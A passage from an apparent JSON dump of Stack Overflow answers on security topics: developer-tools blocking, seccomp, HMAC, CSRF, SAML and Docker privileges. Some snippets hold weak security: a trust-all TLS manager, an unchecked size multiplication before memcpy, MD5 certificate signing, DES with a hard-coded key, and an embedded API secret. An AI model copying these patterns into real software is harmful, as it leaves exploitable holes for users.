        "body": "0000000000000000 |    0       | 00ffffffffffffff |   64 PB | user-space virtual memory, different per mm\n__________________|____________|__________________|_________|___________________________________________________________\n                  |            |                  |         |\n 0000800000000000 |  +64    PB | ffff7fffffffffff | ~16K PB | ... huge, still almost 64 bits wide hole of non-canonical\n                  |            |                  |         |     virtual memory addresses up to the -64 PB\n                  |            |                  |         |     starting offset of kernel mappings.",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-11-27T17:56:01",
        "author": "Peter Cordes"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67186605/how-this-website-is-hiding-all-in-inspect-elements",
    "title": "how this website is hiding all in inspect elements?",
    "question_id": 67186605,
    "posted_date": "2021-04-20T17:32:48",
    "answers": [
      {
        "answer_id": 67187022,
        "body": "function disable_developer_tool(){\n  let checkStatus;\nhotkeys(\"command+option+j,command+option+i,command+shift+c,command+option+c,command+option+k,command+option+z,command+option+e,f12,ctrl+shift+i,ctrl+shift+j,ctrl+shift+c,ctrl+shift+k,ctrl+shift+e,shift+f7,shift+f5,shift+f9,shift+f12\",\n(\n  function(e,t){e.preventDefault()\n}));\nlet element=new Image;\nObject.defineProperty(element,\"id\",{\n  get:function(){\n    throw checkStatus=\"on\",new Error(\"Dev tools checker\")\n  }\n}),\nrequestAnimationFrame((function check({\n  checkStatus=\"off\",\n  console.dir(element),\n  \"on\"===checkStatus?(document.body.parentNode.removeChild(document.body),document.head.parentNode.removeChild(document.head),setTimeout((function(){for(;;)eval(\"debugger\")}),100)):requestAnimationFrame(check)}))}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2021-04-20T18:22:28",
        "author": "Charlie Bamford"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62316720/docker-seccomp-works-for-alpine-busybox-but-not-ubuntu",
    "title": "Docker seccomp works for alpine/busybox but not ubuntu",
    "question_id": 62316720,
    "posted_date": "2020-06-10T23:45:33",
    "answers": [
      {
        "answer_id": 62317292,
        "body": "{\n\"defaultAction\": \"SCMP_ACT_ALLOW\",\n\"architectures\": [\n    \"SCMP_ARCH_X86_64\",\n    \"SCMP_ARCH_X86\",\n    \"SCMP_ARCH_X32\"\n],\n\"syscalls\": [\n    {\n        \"name\": \"chmod\",\n        \"action\": \"SCMP_ACT_ERRNO\",\n        \"args\": []\n    },\n      {\n        \"name\": \"fchmod\",\n        \"action\": \"SCMP_ACT_ERRNO\",\n        \"args\": [\n\n        ]\n      },\n      {\n        \"name\": \"fchmodat\",\n        \"action\": \"SCMP_ACT_ERRNO\",\n        \"args\": [\n\n        ]\n      },\n    {\n        \"name\": \"chown\",\n        \"action\": \"SCMP_ACT_ERRNO\",\n        \"args\": []\n    },\n    {\n        \"name\": \"chown32\",\n        \"action\": \"SCMP_ACT_ERRNO\",\n        \"args\": []\n    }]\n}",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2020-06-11T00:53:20",
        "author": "Adiii"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61724202/where-to-keep-static-information-securely-in-android-app",
    "title": "Where to keep static information securely in Android app?",
    "question_id": 61724202,
    "posted_date": "2020-05-11T03:16:47",
    "answers": [
      {
        "answer_id": 61732752,
        "body": "private fun calculateAPIRequestHMAC(url: URL, authHeaderValue: String): String {\n        val secret = JniEnv().getHmacSecret()\n        var keySpec: SecretKeySpec\n        // Configure the request HMAC based on the demo stage\n        when (currentDemoStage) {\n            DemoStage.API_KEY_PROTECTION, DemoStage.APPROOV_APP_AUTH_PROTECTION -> {\n                throw IllegalStateException(\"calculateAPIRequestHMAC() not used in this demo stage\")\n            }\n            DemoStage.HMAC_STATIC_SECRET_PROTECTION -> {\n                // Just use the static secret to initialise the key spec for this demo stage\n                keySpec = SecretKeySpec(Base64.decode(secret, Base64.DEFAULT), \"HmacSHA256\")\n                Log.i(TAG, \"CALCULATE STATIC HMAC\")\n            }\n            DemoStage.HMAC_DYNAMIC_SECRET_PROTECTION -> {\n                Log.i(TAG, \"CALCULATE DYNAMIC HMAC\")\n                // Obfuscate the static secret to produce a dynamic secret to initialise the key\n                // spec for this demo stage\n                val obfuscatedSecretData = Base64.decode(secret, Base64.DEFAULT)\n                val shipFastAPIKeyData = loadShipFastAPIKey().toByteArray(Charsets.UTF_8)\n                for (i in 0 until minOf(obfuscatedSecretData.size, shipFastAPIKeyData.size)) {\n                    obfuscatedSecretData[i] = (obfuscatedSecretData[i].toInt() xor shipFastAPIKeyData[i].toInt()).toByte()\n                }\n                val obfuscatedSecret = Base64.encode(obfuscatedSecretData, Base64.DEFAULT)\n                keySpec = SecretKeySpec(Base64.decode(obfuscatedSecret, Base64.DEFAULT), \"HmacSHA256\")\n            }\n        }\n        Log.i(TAG, \"protocol: ${url.protocol}\")\n        Log.i(TAG, \"host: ${url.host}\")\n        Log.i(TAG, \"path: ${url.path}\")\n        Log.i(TAG, \"Authentication: $authHeaderValue\")\n        // Compute the request HMAC using the HMAC SHA-256 algorithm\n        val hmac = Mac.getInstance(\"HmacSHA256\")\n        hmac.init(keySpec)\n        hmac.update(url.protocol.toByteArray(Charsets.UTF_8))\n        hmac.update(url.host.toByteArray(Charsets.UTF_8))\n        hmac.update(url.path.toByteArray(Charsets.UTF_8))\n        hmac.update(authHeaderValue.toByteArray(Charsets.UTF_8))\n        return hmac.doFinal().toHex()\n    }",
        "score": 2,
        "is_accepted": true,
        "creation_date": "2020-05-11T10:57:41",
        "author": "Exadra37"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54668498/symfony4-multiple-guard-authenticator-redirect-problem",
    "title": "Symfony4 multiple guard authenticator redirect problem",
    "question_id": 54668498,
    "posted_date": "2019-02-13T05:55:21",
    "answers": [
      {
        "answer_id": 54687787,
        "body": "/**\n     * Overrided to avoid redirection loop\n     * @param Request $request\n     * @param AuthenticationException|null $authException\n     *\n     * @return RedirectResponse|Response\n     * @throws \\Exception\n     */\n    public function start(Request $request, AuthenticationException $authException = null)\n    {\n        $url = $this->getLoginUrl();\n        // If URL different than login one, redirect to login one\n        if($url !== $this->urlGenerator->generate($request->attributes->get('_route'))) {\n            return new RedirectResponse($url);\n        }\n        // Render login page as a subrequest for this call only\n        else {\n            $path['_controller'] = SecurityController::class . '::adminLogin';\n            $subRequest = $request->duplicate([], null, $path);\n            return $this->kernel->handle($subRequest, HttpKernelInterface::SUB_REQUEST);\n        }\n    }",
        "score": 2,
        "is_accepted": false,
        "creation_date": "2019-02-14T05:04:55",
        "author": "nbonniot"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68167184/how-to-disable-ssl-verification-while-running-groovy-script-url",
    "title": "How to Disable SSL verification while running groovy script URL?",
    "question_id": 68167184,
    "posted_date": "2021-06-28T12:48:22",
    "answers": [
      {
        "answer_id": 68168192,
        "body": "import javax.net.ssl.HttpsURLConnection\nimport javax.net.ssl.SSLContext\nimport javax.net.ssl.SSLEngine\nimport javax.net.ssl.SSLSocketFactory\nimport javax.net.ssl.TrustManager\nimport javax.net.ssl.X509ExtendedTrustManager\nimport java.security.cert.CertificateException\nimport java.security.cert.X509Certificate\nclass UnsafeTrustManager extends X509ExtendedTrustManager {\n    @Override\n    void checkClientTrusted(X509Certificate[] x509Certificates, String s, Socket socket) throws CertificateException {}\n    @Override\n    void checkServerTrusted(X509Certificate[] x509Certificates, String s, Socket socket) throws CertificateException {}\n    @Override\n    void checkClientTrusted(X509Certificate[] x509Certificates, String s, SSLEngine sslEngine) throws CertificateException {}\n    @Override\n    void checkServerTrusted(X509Certificate[] x509Certificates, String s, SSLEngine sslEngine) throws CertificateException {}\n    @Override\n    void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {}\n    @Override\n    void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {}\n    @Override\n    X509Certificate[] getAcceptedIssuers() {\n        return new X509Certificate[0]\n    }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-06-28T14:08:39",
        "author": "Hakan54"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64382459/vulnerability-of-malloc-and-memcpy",
    "title": "Vulnerability of malloc and memcpy",
    "question_id": 64382459,
    "posted_date": "2020-10-15T23:19:22",
    "answers": [
      {
        "answer_id": 64407895,
        "body": "#include <stdlib.h>\n#include <string.h>\nvoid *copy_elements(const void *ele_src[], int ele_cnt, size_t ele_size)\n{\n    /*\n     * Allocate buffer for ele_cnt objects, each of ele_size bytes\n     * and copy from locations designated by ele_src\n     */\n    void *result;\n    if (ele_cnt <= 0 || ele_size == 0) {\n        /* invalid arguments */\n        return NULL;\n    }\n    if ((result = malloc(ele_cnt * ele_size)) == NULL) {\n        /* malloc failure */\n        return NULL;\n    }\n    /* copy all elements with a single call to memcpy */\n    return memcpy(result, ele_src, ele_cnt * ele_size);\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2020-10-17T18:17:10",
        "author": "chqrlie"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63651542/php-how-to-use-csrf-token-in-multiple-forms-on-the-same-page",
    "title": "PHP - How to use csrf token in multiple forms on the same page",
    "question_id": 63651542,
    "posted_date": "2020-08-29T16:34:31",
    "answers": [
      {
        "answer_id": 63654207,
        "body": "<?php\nfunction csrf_token() {\n    return bin2hex(random_bytes(35));\n}\nfunction create_csrf_token() {\n    if (isset($_SESSION['csrf_token'])) {\n        return $_SESSION['csrf_token'];\n    }\n    $token = csrf_token();\n    $_SESSION['csrf_token'] = $token;\n    $_SESSION['csrf_token_time'] = time();\n    return $token;\n}\nfunction csrf_token_tag() {\n    $token = create_csrf_token();\n    return '<input type=\"hidden\" name=\"csrf_token\" value=\"' . $token . '\">';\n}\n$csrf_token = csrf_token_tag();\n?>\n<form action=\"\" method=\"post\">\n    ...\n    <?= $csrf_token; ?>\n</form>\n<form action=\"\" method=\"post\">\n    ...\n    <?= $csrf_token; ?>\n</form>",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2020-08-30T01:21:54",
        "author": "James Elliott"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54457520/x509-certificate-for-google-cloud-hsm",
    "title": "X509 certificate for Google Cloud HSM",
    "question_id": 54457520,
    "posted_date": "2019-01-31T04:40:09",
    "answers": [
      {
        "answer_id": 54529935,
        "body": "/**\n     * Create a self-signed X.509 based on a public key\n     * @param googlePublicKey the Public key downloaded from Google Cloud HSM\n     * @param dn        the X.509 Distinguished Name, eg \"CN=Test, L=London, C=GB\"\n     * @param days      how many days from now the Example is valid for\n     * @param algorithm the signing algorithm, eg \"SHA1withRSA\"\n     */\n    public static X509Certificate generateRSACertificate(String googlePublicKey, String dn, int days, String algorithm)\n            throws GeneralSecurityException, IOException {\n        byte[] derKey = Base64.decodeBase64(googlePublicKey);\n        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(derKey);\n        PublicKey rsaKey = KeyFactory.getInstance(\"RSA\").generatePublic(keySpec);\n        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\"RSA\");\n        KeyPair keyPair = keyPairGenerator.generateKeyPair();\n        PrivateKey privkey = keyPair.getPrivate();\n        X509CertInfo info = new X509CertInfo();\n        Date from = new Date();\n        Date to = new Date(from.getTime() + days * 86400000l);\n        CertificateValidity interval = new CertificateValidity(from, to);\n        BigInteger sn = new BigInteger(64, new SecureRandom());\n        X500Name owner = new X500Name(dn);\n        info.set(X509CertInfo.VALIDITY, interval);\n        info.set(X509CertInfo.SERIAL_NUMBER, new CertificateSerialNumber(sn));\n        info.set(X509CertInfo.SUBJECT, owner);\n        info.set(X509CertInfo.ISSUER, owner);\n        info.set(X509CertInfo.KEY, new CertificateX509Key(rsaKey));\n        info.set(X509CertInfo.VERSION, new CertificateVersion(CertificateVersion.V3));\n        AlgorithmId algo = new AlgorithmId(AlgorithmId.md5WithRSAEncryption_oid);\n        info.set(X509CertInfo.ALGORITHM_ID, new CertificateAlgorithmId(algo));\n        // Sign the cert to identify the algorithm that's used.\n        X509CertImpl cert = new X509CertImpl(info);\n        cert.sign(privkey, algorithm);\n        // Update the algorith, and resign.\n        algo = (AlgorithmId) cert.get(X509CertImpl.SIG_ALG);\n        info.set(CertificateAlgorithmId.NAME + \".\" + CertificateAlgorithmId.ALGORITHM, algo);\n        cert = new X509CertImpl(info);\n        cert.sign(privkey, algorithm);\n        return cert;\n    }",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-02-05T03:00:28",
        "author": "Suchak Jani"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/75952200/how-do-i-update-my-docker-container-so-that-its-unprivileged",
    "title": "How do I update my Docker container so that it&#39;s unprivileged?",
    "question_id": 75952200,
    "posted_date": "2023-04-06T13:23:06",
    "answers": [
      {
        "answer_id": 75952201,
        "body": "# nginxinc/nginx-unprivileged:alpine-slim has container vulnerabilities that do not pass AquaScan, even after updating. 3/21/2023.\nFROM nginx:alpine-slim\n# implement changes required to run NGINX as an unprivileged user\nRUN sed -i 's,listen       80;,listen       8080;,' /etc/nginx/conf.d/default.conf \\\n  && sed -i '/user  nginx;/d' /etc/nginx/nginx.conf \\\n  && sed -i 's,/var/run/nginx.pid,/tmp/nginx.pid,' /etc/nginx/nginx.conf \\\n  && sed -i \"/^http {/a \\    proxy_temp_path /tmp/proxy_temp;\\n    client_body_temp_path /tmp/client_temp;\\n    fastcgi_temp_path /tmp/fastcgi_temp;\\n    uwsgi_temp_path /tmp/uwsgi_temp;\\n    scgi_temp_path /tmp/scgi_temp;\\n\" /etc/nginx/nginx.conf \\\n  # nginx user must own the cache and etc directory to write cache and tweak the nginx config    && chown -R $UID:0 /var/cache/nginx \\\n  && chmod -R g+w /var/cache/nginx \\\n  && chown -R $UID:0 /etc/nginx \\\n  && chmod -R g+w /etc/nginx\nCOPY --chown=nginx:nginx ./docker/nginx/nginx.conf /etc/nginx/conf.d/default.conf\nWORKDIR /usr/share/nginx/html\nUSER nginx\nEXPOSE 8080\nCOPY build .",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2023-04-06T13:23:06",
        "author": "Super Jade"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72317372/error-403-message-seen-during-api-testing-in-duo-even-though-valid-credentials-w",
    "title": "Error 403 message seen during API testing in DUO even though valid credentials were provided. Does wrong integration type mean i need a new key?",
    "question_id": 72317372,
    "posted_date": "2022-05-20T06:27:26",
    "answers": [
      {
        "answer_id": 72331970,
        "body": "const cannon = [\n    new Date().toUTCString(),\n    pm.request.method,\n    pm.request.url.host.join('.'),\n    '/'+pm.request.url.path.join('/'),\n];\nif (pm.request.body.urlencoded){\n    cannon.push(pm.request.body.urlencoded);\n}\nfunction hmacSign(cannon, integrationKey, secretKey){\n    const message = cannon.join(\"\\n\");\n    console.log(message);\n    var hmac =  CryptoJS.HmacSHA1(message, secretKey)\n    return btoa(`${integrationKey}:${hmac}`)\n}\nconst sign = hmacSign(cannon, \"DIWJ8X6AEYOR5OMC6TQ1\", \"Zh5eGmUq9zpfQnyUIu5OL9iWoMMv5ZNmk3zLJ4Ep\")\npm.request.headers.add({\n    key: \"authorization\",\n    value: sign\n});",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-05-21T13:48:55",
        "author": "cedric"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69064416/terraform-aws-and-sts-the-security-token-included-in-the-request-is-invalid",
    "title": "Terraform, AWS and STS The security token included in the request is invalid",
    "question_id": 69064416,
    "posted_date": "2021-09-05T10:45:18",
    "answers": [
      {
        "answer_id": 75902960,
        "body": "    $ aws configure sso --profile default\n    SSO session name (Recommended):\n    WARNING: Configuring using legacy format (e.g. without an SSO session).\n    Consider re-running \"configure sso\" command and providing a session name.\n    SSO start URL [None]: https://yourstuff.awsapps.com/start\n    SSO region [None]: <your-sso-region>\n    Attempting to automatically open the SSO authorization page in your default browser.\n    If the browser does not open or you wish to use a different device to authorize this request, open the following URL:\n\n    https://device.sso.us-east-1.amazonaws.com/\n\n    Then enter the code:\n    XXX",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2023-03-31T17:44:51",
        "author": "Skip"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68568827/unsafe-object-binding-checkmarx",
    "title": "Unsafe Object binding Checkmarx",
    "question_id": 68568827,
    "posted_date": "2021-07-28T20:40:46",
    "answers": [
      {
        "answer_id": 71737547,
        "body": "public class ColumnConfigDto {\n    // Ensure @JsonProperty existed on each field\n    @JsonProperty(\"key\")\n    private String key;\n    @JsonProperty(\"isVisible\")\n    private Boolean isVisible;\n    @JsonProperty(\"list\")\n    private List list;\n    public String getKey() {\n        return key;\n    }\n    public void setKey(String key) {\n        this.key = key;\n    }\n    public Boolean getVisible() {\n        return isVisible;\n    }\n\n// Remove boxed type field\n//    public void setVisible(Boolean visible) {\n//        isVisible = visible;\n//    }\n    public List getList() {\n        return list;\n    }\n// Remove boxed type field\n//    public void setList(List list) {\n//        this.list = list;\n//    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2022-04-04T08:50:35",
        "author": "Stephen"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68245522/globalplatformpro-how-to-do-key-diversification",
    "title": "GlobalPlatformPro How to do key diversification",
    "question_id": 68245522,
    "posted_date": "2021-07-04T10:06:35",
    "answers": [
      {
        "answer_id": 68248891,
        "body": "$ gpp -verbose -lock emv:$(cat master_key)\n\u2026\nWarning: no keys given, defaulting to 404142434445464748494A4B4C4D4E4F\n[INFO] GPSession - Using card master keys with version 0 for setting up session [MAC]\n[INFO] GPSession - Diversified card keys: ENC=404142434445464748494A4B4C4D4E4F (KCV: 8BAF47) MAC=404142434445464748494A4B4C4D4E4F (KCV: 8BAF47) DEK=404142434445464748494A4B4C4D4E4F (KCV: 8BAF47) for SCP02\n\u2026\nA000000003000000 locked with: \u2026\nKeys were diversified with EMV and \u2026\nWrite this down, DO NOT FORGET/LOSE IT!\n$ gpp --unlock --key-enc 404142434445464748494A4B4C4D4E4F --key-mac 404142434445464748494A4B4C4D4E4F --key-dek 404142434445464748494A4B4C4D4E4F\nFailed to open secure channel: Card cryptogram invalid!\n\u2026\n$ gpp -verbose -unlock -key emv:$(cat master_key)\n\u2026\n[INFO] GPSession - Using card master keys with version 0 for setting up session [MAC]\n[INFO] GPSession - Diversified card keys: ENC=89EF06C10723B737246259BE40B918C3 (KCV: 787239) MAC=49913E9A80E1B6128AF6C3AAEF0B6062 (KCV: D52C48) DEK=E63A8D78628F2E0FA6B4AC73669087DD (KCV: D1F762) for SCP02 with EMV\n\u2026\nDefault 404142434445464748494A4B4C4D4E4F set as key for \u2026",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2021-07-04T17:25:13",
        "author": "Gamification"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55726649/how-do-i-store-sensitive-data-such-as-database-passwords-in-an-oracle-database",
    "title": "How do i store sensitive data (such as Database passwords) in an Oracle Database",
    "question_id": 55726649,
    "posted_date": "2019-04-17T07:34:30",
    "answers": [
      {
        "answer_id": 55730785,
        "body": "// Encrypt the text\n\t\tpublic static string EncryptText(string strText)\n\t\t{\n\t\t\treturn Encrypt(strText, \"a#94tOc*\"); // use any string to encrypt other than a#94tOc*\n\t\t}\n\t\t//The function used to encrypt the text\n\t\tprivate static string Encrypt(string strText, string strEncrKey)\n\t\t{\n\t\t\tbyte[] byKey = { };\n\t\t\tbyte[] IV = { 0X12, 0X34, 0X56, 0X78, 0X90, 0XAB, 0XCD, 0XEF };\n\t\t\tbyKey = System.Text.Encoding.UTF8.GetBytes(strEncrKey.Substring(0, 8));\n\t\t\tDESCryptoServiceProvider des = new DESCryptoServiceProvider();\n\t\t\tbyte[] inputByteArray = System.Text.Encoding.UTF8.GetBytes(strText);\n\t\t\tMemoryStream ms = new MemoryStream();\n\t\t\tCryptoStream cs = new CryptoStream(ms, des.CreateEncryptor(byKey, IV), CryptoStreamMode.Write);\n\t\t\tcs.Write(inputByteArray, 0, inputByteArray.Length);\n\t\t\tcs.FlushFinalBlock();\n\t\t\treturn Convert.ToBase64String(ms.ToArray());\n\t\t}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-04-17T11:07:30",
        "author": "Tejas"
      },
      {
        "answer_id": 55730785,
        "body": "//Decrypt the text\n\t\tpublic static string DecryptText(string strText)\n\t\t{\n\t\t\treturn Decrypt(strText, \"a#94tOc*\"); // use same as encryption string\n\t\t}\n\t\t//The function used to decrypt the text\n\t\tprivate static string Decrypt(string strText, string sDecrKey)\n\t\t{\n\t\t\tbyte[] byKey = { };\n\t\t\tbyte[] IV = { 0X12, 0X34, 0X56, 0X78, 0X90, 0XAB, 0XCD, 0XEF };\n\t\t\tbyte[] inputByteArray = new byte[strText.Length + 1];\n\t\t\tbyKey = System.Text.Encoding.UTF8.GetBytes(sDecrKey.Substring(0, 8));\n\t\t\tDESCryptoServiceProvider des = new DESCryptoServiceProvider();\n\t\t\tinputByteArray = Convert.FromBase64String(strText.Replace(' ', '+'));\n\t\t\tMemoryStream ms = new MemoryStream();\n\t\t\tCryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(byKey, IV), CryptoStreamMode.Write);\n\t\t\tcs.Write(inputByteArray, 0, inputByteArray.Length);\n\t\t\tcs.FlushFinalBlock();\n\t\t\tSystem.Text.Encoding encoding = System.Text.Encoding.UTF8;\n\t\t\treturn encoding.GetString(ms.ToArray());\n\t\t}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-04-17T11:07:30",
        "author": "Tejas"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/38524010/saml-response-and-assertion-is-signed-unsigned",
    "title": "SAML response and assertion is signed/unsigned?",
    "question_id": 38524010,
    "posted_date": "2016-07-22T06:22:02",
    "answers": [
      {
        "answer_id": 79122454,
        "body": "// M1: Evaluating security policy of type\n//     'org.opensaml.ws.security.provider.BasicSecurityPolicy'\n//     for decoded message\n$ ag  \"Evaluating security policy of type\"\njava-openws/src/main/java/org/opensaml/ws/message/decoder/BaseMessageDecoder.java\n82:                        log.debug(\"Evaluating security policy of type '{}' for decoded message\", policy.getClass()\n// M2: Evaluating simple signature rule of type:\n//     org.opensaml.saml2.binding.security.SAML2HTTPPostSimpleSignRule\n$ ag  \"Evaluating simple signature rule of type:\"\njava-opensaml2/src/main/java/org/opensaml/common/binding/security/BaseSAMLSimpleSignatureSecurityPolicyRule.java\n63:        log.debug(\"Evaluating simple signature rule of type: {}\", getClass().getName());\n// M3: HTTP request was not signed via simple signature mechanism, skipping\n$ ag  \"HTTP request was not signed via simple signature mechanism, skipping\"\njava-opensaml2/src/main/java/org/opensaml/common/binding/security/BaseSAMLSimpleSignatureSecurityPolicyRule.java\n86:            log.debug(\"HTTP request was not signed via simple signature mechanism, skipping\");\n// M4: SAML protocol message was not signed, skipping XML signature processing\n$ ag  \"SAML protocol message was not signed, skipping XML signature processing\"\njava-opensaml2/src/main/java/org/opensaml/common/binding/security/SAMLProtocolMessageXMLSignatureSecurityPolicyRule.java\n99:            log.info(\"SAML protocol message was not signed, skipping XML signature processing\");\n// M5: Successfully decoded message.\n$ ag  \"Successfully decoded message\"\njava-openws/src/main/java/org/opensaml/ws/message/decoder/BaseMessageDecoder.java\n94:        log.debug(\"Successfully decoded message.\");",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-10-24T10:38:30",
        "author": "StackzOfZtuff"
      },
      {
        "answer_id": 79122454,
        "body": "/**\n * Extract the signature value from the request, in the form suitable for input into\n * {@link SignatureTrustEngine#validate(byte[], byte[], String, CriteriaSet, Credential)}.\n *\n * Defaults to the Base64-decoded value of the HTTP request parameter named <code>Signature</code>.\n *\n * @param request the HTTP servlet request\n * @return the signature value\n * @throws SecurityPolicyException thrown if there is an error during request processing\n */\nprotected byte[] getSignature(HttpServletRequest request) throws SecurityPolicyException {\n    String signature = request.getParameter(\"Signature\");\n    if (DatatypeHelper.isEmpty(signature)) {\n        return null;\n    }\n    return Base64.decode(signature);\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-10-24T10:38:30",
        "author": "StackzOfZtuff"
      },
      {
        "answer_id": 79122454,
        "body": "public void evaluate(MessageContext messageContext) throws SecurityPolicyException {\n    if (!(messageContext instanceof SAMLMessageContext)) {\n        log.debug(\"Invalid message context type, this policy rule only supports SAMLMessageContext\");\n        return;\n    }\n    SAMLMessageContext samlMsgCtx = (SAMLMessageContext) messageContext;\n    SAMLObject samlMsg = samlMsgCtx.getInboundSAMLMessage();\n    if (!(samlMsg instanceof SignableSAMLObject)) {\n        log.debug(\"Extracted SAML message was not a SignableSAMLObject, can not process signature\");\n        return;\n    }\n    SignableSAMLObject signableObject = (SignableSAMLObject) samlMsg;\n    if (!signableObject.isSigned()) {\n        log.info(\"SAML protocol message was not signed, skipping XML signature processing\");\n        return;\n    }\n    Signature signature = signableObject.getSignature();\n    performPreValidation(signature);\n    doEvaluate(signature, signableObject, samlMsgCtx);\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-10-24T10:38:30",
        "author": "StackzOfZtuff"
      },
      {
        "answer_id": 79122454,
        "body": "public boolean isSigned() {\n    Element domElement = getDOM();\n    if (domElement == null) {\n        return false;\n    }\n    NodeList children = domElement.getChildNodes();\n    Element childElement;\n    for (int i = 0; i < children.getLength(); i++) {\n        if (children.item(i).getNodeType() != Node.ELEMENT_NODE) {\n            continue;\n        }\n        childElement = (Element) children.item(i);\n        if (childElement.getNamespaceURI().equals(XMLConstants.XMLSIG_NS)\n                && childElement.getLocalName().equals(Signature.DEFAULT_ELEMENT_LOCAL_NAME)) {\n            return true;\n        }\n    }\n    return false;\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-10-24T10:38:30",
        "author": "StackzOfZtuff"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70078622/protect-routes-pages-with-nextjs",
    "title": "Protect Routes/Pages with NextJs",
    "question_id": 70078622,
    "posted_date": "2021-11-23T04:48:40",
    "answers": [
      {
        "answer_id": 70080518,
        "body": "export default function SomeComponent() {\n    // some content\n}\nexport async function getServerSideProps({ req }) {\n    const { token } = cookie.parse(req.headers.cookie)\n    const userRes = await fetch(`${URL}/api/user`, {\n        method: 'GET',\n        headers: {\n            'Authorization': `Bearer ${token}`\n        }\n    })\n    const data = await userRes.json()\n    // does not allow access to page if not logged in\n    if (!data.username) {\n        return {\n            redirect: {\n                destination: '/accounts/login',\n                permanent: false,\n            },\n        }\n    }\n    return {\n        props: { data }\n    }\n}",
        "score": 6,
        "is_accepted": true,
        "creation_date": "2021-11-23T06:58:52",
        "author": "kiranr"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70533775/unable-to-execute-code-in-non-text-segments-of-memory-even-with-execstack-enabl",
    "title": "Unable to execute code in non-text segments of memory, even with execstack enabled",
    "question_id": 70533775,
    "posted_date": "2021-12-30T10:46:16",
    "answers": [
      {
        "answer_id": 70534465,
        "body": "foo@bar:~/path/to/file$ gdb -q nop\n/home/foo/.gdbinit:1: Error in sourced command file:\nAmbiguous set command \"dis intel\": disable-randomization, disassemble-next-line, disassembler-options, disassembly-flavor...\nReading symbols from nop...\n(gdb) list\nwarning: Source file is more recent than executable.\n1\tint main(){\n2\t   char nop[] = \"\\xf3\\x0f\\x1e\\xfa\\x55\\x48\\x89\\xe5\\x90\\x5d\\xc3\";\n3\t   ((void(*)(void))nop)();\n4\t}\n(gdb) break 3\nBreakpoint 1 at 0x114a: file nop.c, line 3.\n(gdb) run\nStarting program: /home/foo/path/to/file/nop\nBreakpoint 1, main () at nop.c:3\n3\t   ((void(*)(void))nop)();\n(gdb) x/xi $rip\n=> 0x55555555514a <main+33>:\tlea    -0xc(%rbp),%rax\n(gdb) stepi\n0x000055555555514e\t3\t   ((void(*)(void))nop)();\n(gdb) x/xi $rip\n=> 0x55555555514e <main+37>:\tcallq  *%rax\n(gdb) stepi\n0x00007fffffffe204 in ?? ()\n(gdb) x/xi $rip\n=> 0x7fffffffe204:\tendbr64\n(gdb) stepi\n0x00007fffffffe208 in ?? ()\n(gdb) x/xi $rip\n=> 0x7fffffffe208:\tpush   %rbp\n(gdb) stepi\n0x00007fffffffe209 in ?? ()\n(gdb) x/xi $rip\n=> 0x7fffffffe209:\tmov    %rsp,%rbp\n(gdb) stepi\n0x00007fffffffe20c in ?? ()\n(gdb) x/xi $rip\n=> 0x7fffffffe20c:\tnop\n(gdb) stepi\n0x00007fffffffe20d in ?? ()\n(gdb) x/xi $rip\n=> 0x7fffffffe20d:\tpop    %rbp\n(gdb) stepi\n0x00007fffffffe20e in ?? ()\n(gdb) x/xi $rip\n=> 0x7fffffffe20e:\tretq\n(gdb) stepi\n0x0000555555555150 in main () at nop.c:3\n3\t   ((void(*)(void))nop)();\n(gdb) x/xi $rip\n=> 0x555555555150 <main+39>:\tmov    $0x0,%eax\n(gdb) continue\nContinuing.\n[Inferior 1 (process 68215) exited normally]",
        "score": 3,
        "is_accepted": false,
        "creation_date": "2021-12-30T11:51:57",
        "author": "Neroph"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67767551/how-to-detect-array-entry-deletion-request-in-firestore-rules",
    "title": "How To Detect Array Entry Deletion Request In Firestore Rules",
    "question_id": 67767551,
    "posted_date": "2021-05-30T23:22:44",
    "answers": [
      {
        "answer_id": 67777242,
